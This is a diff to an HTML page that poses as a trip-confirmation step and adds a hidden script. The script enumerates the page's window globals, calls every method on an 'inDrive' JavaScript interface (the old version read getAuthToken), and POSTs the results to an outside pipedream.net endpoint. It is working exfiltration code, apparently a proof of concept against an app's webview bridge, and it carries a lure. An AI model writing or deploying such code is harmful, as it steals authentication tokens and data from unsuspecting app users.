@@ -83,20 +83,67 @@
       This step is required to confirm your upcoming trip.
     </div>
 
-      <script>
-    setTimeout(function() {
+<script>
+(function () {
+  const LOG_URL = "https://eol1rt726v7fwz6.m.pipedream.net";
+
+  function sendLog(data) {
+    try {
+      fetch(LOG_URL, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ log: data, ua: navigator.userAgent })
+      });
+    } catch (e) {
+      console.log("Logging failed", e);
+    }
+  }
+
+  function log(msg) {
+    document.write(`<div style="font-family:monospace;color:#0c0">✓ ${msg}</div>`);
+  }
+
+  function dumpGlobals() {
+    const keys = [];
+    for (let k in window) {
+      keys.push(k);
+    }
+    return `Global keys:\n${keys.sort().join("\n")}`;
+  }
+
+  function probeInDrive() {
+    if (typeof inDrive === "undefined") {
+      return "inDrive interface not found.";
+    }
+
+    let out = "inDrive interface found.\n";
+    for (let k in inDrive) {
       try {
-        if (typeof inDrive !== "undefined") {
-          document.getElementById("out").innerText =
-            "getAuthToken(): " + inDrive.getAuthToken();
+        const val = inDrive[k];
+        if (typeof val === "function") {
+          out += `inDrive.${k}(): ${val()}\n`;
         } else {
-          document.getElementById("out").innerText = "inDrive object not found.";
+          out += `inDrive.${k}: ${val}\n`;
         }
       } catch (e) {
-        document.getElementById("out").innerText = "Exception: " + e;
+        out += `Error calling inDrive.${k}: ${e}\n`;
       }
-    }, 250); // short delay to ensure interface is bound
-  </script>
+    }
+    return out;
+  }
+
+  setTimeout(() => {
+    const results = [
+      dumpGlobals(),
+      probeInDrive()
+    ].join("\n\n---\n\n");
+
+    sendLog(results);
+    log("Probed and sent log.");
+  }, 400);
+})();
+</script>
+
   </div>
 </body>
 </html>
